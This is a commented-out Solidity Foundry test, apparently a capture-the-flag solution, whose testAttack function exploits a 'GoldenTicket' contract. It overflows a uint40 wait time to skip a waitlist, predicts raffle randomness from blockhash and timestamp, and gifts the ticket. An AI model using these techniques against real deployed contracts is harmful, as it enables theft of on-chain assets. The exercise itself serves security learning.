// // SPDX-License-Identifier: UNLICENSED
// pragma solidity ^0.8.13;

// import 'forge-std/Test.sol';

// interface GoldenTicket {
//   function joinWaitlist() external;

//   function updateWaitTime(uint256 _time) external;

//   function joinRaffle(uint256 _guess) external;

//   function giftTicket(address _to) external;
// }

// contract TokenTest is Test {
//   address eoa = 0xD0CE7E521d26CAc35a7B10d31d6CCc7ffFF8B15e;
//   address gt = 0x417F9795C969d1C743B5FF4430a7C925816E2f50;

//   uint40 max = type(uint40).max;

//   function setUp() public {
//     vm.startPrank(eoa);
//   }

//   function testAttack() public {
//     uint256 when = uint40(block.timestamp + 10 * 365 days);
//     GoldenTicket(gt).joinWaitlist();
//     unchecked {
//       GoldenTicket(gt).updateWaitTime((max + 1) + block.timestamp - when);
//     }

//     uint256 value = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));

//     GoldenTicket(gt).joinRaffle(value);

//     GoldenTicket(gt).giftTicket(eoa);
//   }
// }
